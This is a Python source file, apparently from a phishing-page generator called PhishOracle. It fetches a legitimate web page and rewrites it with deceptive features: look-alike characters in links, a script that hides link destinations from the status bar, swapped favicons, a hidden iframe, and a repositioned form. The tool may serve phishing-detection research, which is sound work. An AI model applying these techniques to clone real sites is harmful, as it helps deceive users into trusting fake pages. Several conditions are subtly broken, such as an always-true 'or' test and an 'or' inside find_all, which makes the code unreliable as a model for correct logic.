    #     href_value = anchor_tag['href']
    #     alphanumeric_href_value = href_value.isalnum()
    #     if alphanumeric_href_value:
    #         char_to_replace = random.choice(href_value)
    #         replaced_char = ''
    #         for key in look_alike_characters:
    #             if key == char_to_replace:
    #                 replaced_char += look_alike_characters[key]
    #         new_href_value = replaced_char
    #         anchor_tag['href'] = new_href_value
    #     else:
    #         anchor_tag['href'] = href_value.replace('#', '##')

    for anchor_tag in f12_soup.find_all('a', href=True):
        href_value = anchor_tag['href']
        if '#' or 'Javascript' or 'javascript' in href_value:
            pass
        else:
            for href_value_char in href_value:
                if href_value_char in look_alike_characters:
                    href_value = href_value.replace(href_value_char, look_alike_characters[href_value_char])

        anchor_tag['href'] = href_value

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''

    import copy

    function_12_soup = copy.deepcopy(f12_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_12_output:
        f_12_output.write(str(function_12_soup))


'''
========================================    PHASE 3 (FUNCTION 12) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 13) BEGINS HERE  =======================================
In this feature we replace the blank space with <span> or <p> tag with a character in it and visibility: hidden or display:none; functionality
'''

# def function_13(target_file, obtained_soup_here):
#     import re
#     import string
#
#     print("Adding feature 'Replacing blank space'")
#     write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
#     write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")
#     #
#     # with open(write_file_name, 'rb') as f_13_input:
#     #     function_13_contents = f_13_input.read()
#     #     f13_soup = BeautifulSoup(function_13_contents, 'lxml')
#
#     f13_soup = obtained_soup_here
#
#     # Find all the text nodes in the HTML
#     for node in f13_soup.stripped_strings:
#         # Check if the text node contains blank spaces
#         if " " in node:
#             # Replace the blank spaces with a span tag with visibility:hidden style
#             new_text = node.replace(" ", "<span style='visibility:hidden'>anyText</span>")
#
#             # Replace the old text node with the new text in the soup
#             node.replace_with(new_text)
#
#     # # Update the HTML with the changes
#     # new_html = str(soup)
#     #
#     # text_to_replace = f13_soup.get_text()
#     # print(text_to_replace)
#     #
#     # filling_whitespace_string = '''<p style="display:none;">StringHere</p>'''
#     # text_to_replace.replace(' ', filling_whitespace_string)
#     # f13_soup.html.body.append(BeautifulSoup(text_to_replace, 'html.parser'))
#     f13_soup.prettify()
#     # print("Original Tag:")
#     # print(tag_to_replace)
#     # print("Original Tag Content:")
#     # print(tag_to_replace.text)
#     # original_text = tag_to_replace.text
#     # if str(original_text).isspace():
#     #     new_text = str(original_text).replace(" ", "x")
#     #     # print("New tag content:")
#     #     tag_to_replace.string = new_text
#     # # print(tag_to_replace)
#
#     '''
#     Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
#     '''
#     import copy
#
#     function_13_soup = copy.deepcopy(f13_soup.prettify())
#
#     with open(write_file_name, 'w', encoding='utf-8') as f_13_output:
#         f_13_output.write(str(function_13_soup))


'''
========================================    PHASE 3 (FUNCTION 13) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 13) BEGINS HERE  =======================================
In this feature we add 
'''

# def function_13(target_file):
#     print("Adding feature 'about:blank'")
#     write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
#     write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")
#
#     with open(write_file_name, 'rb') as f_13_input:
#         function_13_contents = f_13_input.read()
#         f13_soup = BeautifulSoup(function_13_contents, 'html.parser')
#         anchor_tag = f13_soup.find('a').find_next_siblings()
#         anchor_tag['href'] = 'about:blank'
#         anchor_tag['target'] = '_blank'
#
#     '''
#     Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
#     '''
#     import copy
#
#     function_13_soup = copy.deepcopy(f13_soup.prettify())
#
#     with open(write_file_name, 'w', encoding='utf-8') as f_13_output:
#         f_13_output.write(str(function_13_soup))


'''
========================================    PHASE 3 (FUNCTION 13) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 14) BEGINS HERE  =======================================
In this feature we hide the status bar address link in web browser
'''


def function_14(target_file, obtained_soup_here):
    print("Adding feature 'Hide status bar address link'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_14_input:
    #     function_14_contents = f_14_input.read()
    #     f14_soup = BeautifulSoup(function_14_contents, 'html.parser')

    f14_soup = obtained_soup_here

    for anchor_tag in f14_soup.find_all('a'):
        anchor_tag['class'] = "hidelink"
        # if anchor_tag.has_attr('style'):
        #     hide_anchor_tag_styles_present = anchor_tag['style']
        #     hide_anchor_tag_additional_styling = hide_anchor_tag_styles_present + "cursor:pointer; text-decoration:underline;"
        #     anchor_tag['style'] = hide_anchor_tag_additional_styling
        # else:
        #     anchor_tag['style'] = "cursor:pointer; text-decoration:underline;"

    hide_link_style_tag = f14_soup.new_tag('style')
    hide_link_style_tag.string = ".hidelink{cursor:pointer; text-decoration:underline;}"
    f14_soup.html.head.append(hide_link_style_tag)

    another_hiding_tag = f14_soup.new_tag('script')
    another_hiding_tag['src'] = "http://code.jquery.com/jquery-1.10.0.min.js"
    f14_soup.html.head.append(another_hiding_tag)

    hide_address_link_script_tag = f14_soup.new_tag('script')
    hide_address_link_script_tag.string = "$(function(){$(\"a.hidelink\").each(function (index, element){var href = " \
                                          "$(this).attr(\"href\");$(this).attr(\"hiddenhref\", " \
                                          "href);$(this).removeAttr(\"href\");});$(\"a.hidelink\").click(function(){" \
                                          "url = $(this).attr(\"hiddenhref\");window.open(url, '_blank');})}); "
    f14_soup.html.head.append(hide_address_link_script_tag)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_14_soup = copy.deepcopy(f14_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_14_output:
        f_14_output.write(str(function_14_soup))


'''
========================================    PHASE 3 (FUNCTION 14) ENDS HERE  ========================================
'''

'''
Visual Similarity-based Features
'''

'''
=======================================    PHASE 3 (FUNCTION 15) BEGINS HERE  =======================================
In this feature we change the font family of the text content in the html file
'''


def function_15(target_file, obtained_soup_here):
    print("Adding feature 'Font Family to text content'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_15_input:
    #     function_15_contents = f_15_input.read()
    #     f15_soup = BeautifulSoup(function_15_contents, 'html.parser')

    f15_soup = obtained_soup_here

    body_tag = f15_soup.find('body')
    if body_tag.has_attr('style'):
        body_tag_present_style = body_tag['style']
        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
        body_tag['style'] = body_tag_additional_styling
    else:
        body_tag['style'] = "width: 100%;"

    for font_tag in f15_soup.find_all('a'):
        if font_tag.has_attr('style'):
            font_family_styles_present = font_tag['style']
            font_family_additional_styling = font_family_styles_present + "font-family:serif; font-style:italic; text-decoration:none;"
            font_tag['style'] = font_family_additional_styling
        else:
            font_tag['style'] = "font-family:serif; font-style:italic; text-decoration:none;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_15_soup = copy.deepcopy(f15_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_15_output:
        f_15_output.write(str(function_15_soup))


'''
========================================    PHASE 3 (FUNCTION 15) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 16) BEGINS HERE  =======================================
In this feature we change the border styling in the html file
'''


def function_16(target_file, obtained_soup_here):
    print("Adding feature 'Border Styling'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_16_input:
    #     function_16_contents = f_16_input.read()
    #     f16_soup = BeautifulSoup(function_16_contents, 'html.parser')

    f16_soup = obtained_soup_here
    body_tag = f16_soup.find('body')
    if body_tag.has_attr('style'):
        body_tag_present_style = body_tag['style']
        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
        body_tag['style'] = body_tag_additional_styling
    else:
        body_tag['style'] = "width: 100%;"

    for div_tag in f16_soup.find_all('div'):
        if div_tag.has_attr('style'):
            div_tag_styles_present = div_tag['style']
            div_tag_additional_styling = div_tag_styles_present + "border-width: 2px; border-color: grey;"
            div_tag['style'] = div_tag_additional_styling
        else:
            div_tag['style'] = "border-width: 2px; border-color: grey;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_16_soup = copy.deepcopy(f16_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_16_output:
        f_16_output.write(str(function_16_soup))


'''
========================================    PHASE 3 (FUNCTION 16) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 17) BEGINS HERE  =======================================
In this feature we change the text styling like: align center, capitalize, shadow, ... in the html file
'''


def function_17(target_file, obtained_soup_here):
    print("Adding feature 'Text Styling'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_17_input:
    #     function_17_contents = f_17_input.read()
    #     f17_soup = BeautifulSoup(function_17_contents, 'html.parser')

    f17_soup = obtained_soup_here
    # for text_tag in f17_soup.find_all('h2' or 'p' or 'h1'):
    #     text_tag[
    #         'style'] = "text-align: center; color: blue; text-transform: capitalize; text-shadow: 1px 1px grey;"
    body_tag = f17_soup.find('body')
    if body_tag.has_attr('style'):
        body_tag_present_style = body_tag['style']
        body_tag_additional_styling = body_tag_present_style + "width: 100%;"
        body_tag['style'] = body_tag_additional_styling
    else:
        body_tag['style'] = "width: 100%;"

    for text_tag in f17_soup.find_all('h2' or 'p' or 'h1'):
        if text_tag.has_attr('style'):
            text_tag_present_style = text_tag['style']
            text_tag_additional_styling = text_tag_present_style + "text-align: center; color: #4A667E; text-transform: capitalize; text-shadow: 1px 1px grey;"
            text_tag['style'] = text_tag_additional_styling
        else:
            text_tag[
                'style'] = "text-align: center; color: #4A667E; text-transform: capitalize; text-shadow: 1px 1px grey;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_17_soup = copy.deepcopy(f17_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_17_output:
        f_17_output.write(str(function_17_soup))


'''
========================================    PHASE 3 (FUNCTION 17) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 18) BEGINS HERE  =======================================
In this feature we replace the logo with our image keeping the same dimension as specified by developer in the html file
'''


def function_18(target_file, obtained_soup_here):
    print("Adding feature 'Replace logo image'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_18_input:
    #     function_18_contents = f_18_input.read()
    #     f18_soup = BeautifulSoup(function_18_contents, 'html.parser')

    f18_soup = obtained_soup_here

    for img_tag in f18_soup.find_all('img'):
        if img_tag.has_attr('style'):
            img_tag_present_style = img_tag['style']
            img_tag_additional_styling = img_tag_present_style + "opacity:0.7;"
            img_tag['style'] = img_tag_additional_styling
        else:
            img_tag['style'] = "opacity:0.7;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_18_soup = copy.deepcopy(f18_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_18_output:
        f_18_output.write(str(function_18_soup))


'''
========================================    PHASE 3 (FUNCTION 18) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 19) BEGINS HERE  =======================================
In this feature we replace the favicon in the html file
'''


# from PIL import Image
# import requests


def function_19(target_file, obtained_soup_here):
    print("Adding feature 'Favicon'")

    # '''Download the Favicon from web page'''
    # icon_link = None
    # for link in obtained_soup_here.find_all("link", attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)}):
    #     icon_link = link.get("href", None)
    #     break
    #
    # if icon_link:
    #     response = requests.get(icon_link)
    #     with open("favicon.ico", "wb") as f:
    #         f.write(response.content)
    #
    # else:
    #     print("Favicon not found")

    f19_soup = obtained_soup_here
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))

    # favicon_tag = f19_soup.find_all('link', attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)})
    # # favicon_content = requests.get(favicon_tag['href']).content
    # # with open('favicon.ico', 'wb') as favicon_file_input:
    # #     favicon_file_input.write(favicon_ontent)c
    # # favicon_file = open('favicon.ico', 'rb')
    # # favicon_tag['href'] = favicon_file
    # icon_link = f19_soup.find_all('link', attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)})
    # icon_href_link = icon_link['href']
    # icon = urllib.request.urlopen(icon_href_link)
    #
    # with open('web_page_favicon.png', 'wb') as f:
    #     f.write(icon.read())
    #
    # from PIL import Image
    # im_rgb = Image.open('web_page_favicon.png')
    # im_rgba = im_rgb.copy()
    # im_rgba.putalpha(128)
    # im_rgba.save('lighter_web_page_favicon.png')
    #
    # new_favicon_link = f19_soup.new_tag("link", href="lighter_web_page_favicon.png", rel="icon")
    # icon_link.replace_with(new_favicon_link)
    favicon_link = f19_soup.find("link", rel="icon") or f19_soup.find("link", rel="shortcut icon")

    if favicon_link:
        # # get the URL of the favicon
        # favicon_url = favicon_link["href"]
        # print(favicon_url)
        # print(type(favicon_url))
        #
        # if favicon_url.startswith('https'):
        #     try:
        #         # download the favicon
        #         response = requests.get(favicon_url)
        #     except urllib.error.HTTPError as e:
        #         print('HTTP Error: {}'.format(e.code))
        #     except urllib.error.URLError as e:
        #         print('URL Error: {}'.format(e.reason))
        #     else:
        #         with open("favicon.ico", "wb") as f:
        #             f.write(response.content)
        #
        #         # make the favicon lighter
        #         from PIL import Image
        #         with open("favicon.ico", "rb") as f:
        #             image = Image.open(f)
        #             grayscale_image = image.convert("L")
        #             adjusted_image = Image.eval(grayscale_image, lambda x: x + 50)
        #             adjusted_image.save("lighter_favicon.ico")
        #
        #         # update the favicon link tag with the URL of the new lighter favicon
        #         new_favicon_link = f19_soup.new_tag("link", href="lighter_favicon.ico", rel="icon", type="image/x-icon")
        #         favicon_link.replace_with(new_favicon_link)
        # else:
        favicon_images = ['https://ssl.gstatic.com/docs/presentations/images/favicon5.ico',
                          'https://storage.googleapis.com/operating-anagram-8280/apple-touch-icon.png',
                          'https://www.youtube.com/s/desktop/5737b328/img/favicon.ico']

        # with open(write_file_name, 'rb') as f_19_input:
        #     function_19_contents = f_19_input.read()
        #     f19_soup = BeautifulSoup(function_19_contents, 'html.parser')

        for favicon_item in f19_soup.find_all('link',
                                              attrs={'rel': re.compile("^(shortcut icon|icon)$", re.I)}):
            favicon_item['href'] = random.choice(favicon_images)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_19_soup = copy.deepcopy(f19_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_19_output:
        f_19_output.write(str(function_19_soup))


'''
========================================    PHASE 3 (FUNCTION 19) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 20) BEGINS HERE  =======================================
In this feature we add the iFrame in the html file
'''


def function_20(target_file, obtained_soup_here):
    print("Adding feature 'IFrame'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_20_input:
    #     function_20_contents = f_20_input.read()
    #     f20_soup = BeautifulSoup(function_20_contents, 'lxml')

    f20_soup = obtained_soup_here
    iframe_tag = f20_soup.new_tag('iframe')
    iframe_tag['src'] = "https://facebook.com"
    iframe_tag['style'] = "display:none;"
    iframe_tag.string = 'Login Here'
    f20_soup.html.body.append(iframe_tag)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_20_soup = copy.deepcopy(f20_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_20_output:
        f_20_output.write(str(function_20_soup))


'''
========================================    PHASE 3 (FUNCTION 20) ENDS HERE  ========================================
'''

# '''
# =======================================    PHASE 3 (FUNCTION 21) BEGINS HERE  =======================================
# In this feature we add line thickness as visual feature in the html file
# '''
#
#
# def function_21(target_file):
#     print("Adding feature 'Line Colored Thickness'")
#     write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
#     write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")
#
#     with open(write_file_name, 'rb') as f_21_input:
#         function_21_contents = f_21_input.read()
#         f21_soup = BeautifulSoup(function_21_contents, 'lxml')
#         hr_tag = f21_soup.new_tag('hr')
#         hr_tag['style'] = "position:relative; top:20px; border:none; height:12px; background:grey; " \
#                           "margin-bottom:20px; "
#         f21_soup.html.body.append(hr_tag)
#
#     '''
#     Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
#     '''
#     import copy
#
#     function_21_soup = copy.deepcopy(f21_soup.prettify())
#
#     with open(write_file_name, 'w', encoding='utf-8') as f_21_output:
#         f_21_output.write(str(function_21_soup))
#
#
# '''
# ========================================    PHASE 3 (FUNCTION 21) ENDS HERE  ========================================
# '''

'''
=======================================    PHASE 3 (FUNCTION 22) BEGINS HERE  =======================================
In this feature we swap the position of form and its siblings in the html file
'''


def function_22(target_file, obtained_soup_here):
    print("Adding feature 'Swap Positions'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))

    f22_soup = obtained_soup_here

    # Find the form tag and its sibling
    found_form = f22_soup.find('form')

    if found_form.find_previous_sibling():
        sibling_tag = found_form.find_previous_sibling()
        sibling_tag.insert_before(found_form)
    if found_form.find_next_sibling():
        sibling_tag = found_form.find_next_sibling()
        sibling_tag.insert_after(found_form)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_22_soup = copy.deepcopy(f22_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_22_output:
        f_22_output.write(str(function_22_soup))


'''
========================================    PHASE 3 (FUNCTION 22) ENDS HERE  ========================================
'''


one_out_of_three = [function_1, function_14, function_15]
all_functions = {'a_href_status_ff': random.choice(one_out_of_three), '_form_': function_8,
                 'a_dis_button': function_11, 'h1_text': function_17,
                 'h2_text': function_17, 'p_text': function_17,
                 'logo_img': function_18}

function_list = [function_3, function_4, function_5, function_6, function_7, function_9, function_10,
                 function_16, function_19, function_20]
function_list_names = ['dummy_comments', 'dummy_div', 'dummy_script', 'dummy_link', 'body_opacity', 'dummy_img',
                       'dummy_anchor', 'border_styling', 'change_favicon', 'iFrame']

function_list_dictionary = {'a_href_status_ff': random.choice(['function_1', 'function_14', 'function_15']),
                            'dummy_comments': 'function_3', 'dummy_div': 'function_4', 'dummy_script': 'function_5',
                            'dummy_link': 'function_6', 'body_opacity': 'function_7', '_form_': 'function_8',
                            'dummy_img': 'function_9', 'dummy_anchor': 'function_10', 'a_dis_button': 'function_11',
                            'border_styling': 'function_16', 'p_text': 'function_17', 'logo_img': 'function_18',
                            'change_favicon': 'function_19', 'iFrame': 'function_20'}


file_name = "legitimate_file.html"
target_file_name = file_name


# Placeholder for generate_features function (customize as needed)
def generate_features(user_input):
    """
        Use urllib library to open a URL and get the code and content of the web page
        """
    features = []
    features_to_add = []

    '''
    PHASE 1: Get the web page source code through URL
    ========================================================================================================================
    '''

    # n = int(input("Enter the total number of legitimate sites to add phishing features: "))
    #
    # target_URL_list = []
    # for i in range(0, n):
    #     url = input("Enter URL " + str(i) + ": ")
    #     target_URL_list.append(url)

    target_URL = str(user_input)
    print(target_URL)

    domain_name = urlparse(target_URL).netloc

    # length_of_legitimate_URL = len(target_URL)
    legitimate_URL = target_URL

    import urllib
    req = urllib.request.Request(legitimate_URL)
    req.add_header("Cookie", "example_cookie=value")
    user_agent_values = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
    req.add_header("User-Agent", user_agent_values)
    try:
        response = urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        print('HTTP Error: {}'.format(e.code))
    except urllib.error.URLError as e:
        print('URL Error: {}'.format(e.reason))
    else:
        data = response.read()
        # print('-----------------------------------------------------------------')
        # print('The connection code to the web page is: ')
        # print('The result code is: ', str(webURL.getcode()))
        #
        # # time.sleep(5)
        # data = webURL.read()

        '''
        PHASE 2: copy the web page source code to local .html file
        ========================================================================================================================
        '''
        '''
        Write the content to a file in local to make further modifications
        '''

        # file_name = os.path.join("0.html")
        with open(file_name, 'wb') as f:
            f.write(data)

        '''
        Using webbrowser and os libraries locate the file and open it in the web browser
        '''

        # webbrowser.open_new_tab(file_name)
        # function_1(target_file_name)
        #
        # function_call_list = [function_2, function_4, function_5, function_6, function_7, function_9,
        #                       function_10, function_11, function_12]
        #
        # new_call_list = random.sample(function_call_list, (k - 1))
        # for j in range(len(new_call_list)):
        #     new_call_list[j](target_file_name)

        functions_to_call = []

        # populate possible feature names
        possible_features = []

        with open(file_name, 'rb') as f_input:
            contents = f_input.read()
            soup = BeautifulSoup(contents, 'lxml')

            # total_functions = 14
            # for function_iterator in range(0, total_functions):
            if soup.find_all('a'):
                # if 'a_href' or 'a_en_dis' or 'a_dis' or 'a_status' or 'a_ff' or 'a_look_alike' not in functions_to_call:
                functions_to_call.append('a_href_status_ff')
                # functions_to_call.append('a_en_dis')
                functions_to_call.append('a_dis_button')
                # functions_to_call.append('a_status')
                # functions_to_call.append('a_ff')
                # functions_to_call.append('a_look_alike')
            if soup.find_all('img'):
                # if 'img' not in functions_to_call:
                # functions_to_call.append('img')
                functions_to_call.append('logo_img')
            if soup.find_all('form'):
                # if 'form' not in functions_to_call:
                functions_to_call.append('_form_')
                # functions_to_call.append('swap_form')
            if soup.find_all('h1'):
                # if 'h1' not in functions_to_call:
                # functions_to_call.append('h1')
                functions_to_call.append('h1_text')
            if soup.find_all('h2'):
                # if 'h2' not in functions_to_call:
                # functions_to_call.append('h2')
                functions_to_call.append('h2_text')
            if soup.find_all('p'):
                # if 'p' not in functions_to_call:
                # functions_to_call.append('p')
                functions_to_call.append('p_text')
        # print(functions_to_call)
        # print(type(all_functions))
        # print(type(functions_to_call))
        # print(functions_to_call)
        '''
        This code is not required from this
        '''
        # for key in functions_to_call:
        #     if key in all_functions:
        #         print(all_functions[key])
        #         function_list.append(all_functions[key])
        #
        # # print('Function list possible are:')
        # # print(function_list)
        #
        # function_list_set = set(function_list)
        # print(function_list_set)
        # new_function_list = list(function_list_set)
        # print(new_function_list)
        '''
        to this
        '''

        possible_features = functions_to_call + function_list_names

        features_to_add = list(set(possible_features))

    features = features_to_add
    return features


# Placeholder for generate_final_html function (customize as needed)
def generate_final_html(selected_features):
    # Perform your logic here to generate the final HTML content
    # based on the selected features.
    # For example, you can create an HTML table or list.
    final_html = "<h1>Selected Features:</h1>"
    final_html += "<ul>"
    for feature in selected_features:
        final_html += f"<li>{feature}</li>"
    final_html += "</ul>"


    '''
    Now the selected user features need to be called
    '''
    # k = len(features_to_add)
    # for key in functions_to_call:
    #     if key in all_functions:
    #         function_list.append(all_functions[key])
    #
    # function_list_set = set(function_list)
    # new_function_list = list(function_list_set)
    # print(new_function_list)

    # print(function_list)
    write_file = "E:\\Complete_Python\\_PhishOracle_Webapp\\"
    write_file_name = os.path.join(write_file, str(target_file_name))

    function_2(target_file_name)
    # new_call_list = random.sample(new_function_list, (k - 1))
    phishing_file_name = phishing_folder_path + file_name

    with open(phishing_file_name, 'rb') as file_input:
        file_contents = file_input.read()
        obtained_soup = BeautifulSoup(file_contents, 'lxml')

    new_soup = obtained_soup

    for feature in selected_features:
        if feature in function_list_dictionary:
            function_name = function_list_dictionary[feature]
            function_to_call = globals()[function_name]
            function_to_call(target_file_name, new_soup)

    # for j in range(len(new_call_list)):
    #     # print(new_call_list[j])
    #     # print("Calling function " + str(new_function_list[j]))
    #     print("---------------------------------------------")
    #     new_call_list[j](target_file_name, new_soup)
    #
    #     with open(write_file_name, 'rb') as file_input_again:
    #         file_contents_again = file_input_again.read()
    #         new_contents_soup = BeautifulSoup(file_contents_again, 'lxml')
    #     new_soup = new_contents_soup

    return final_html
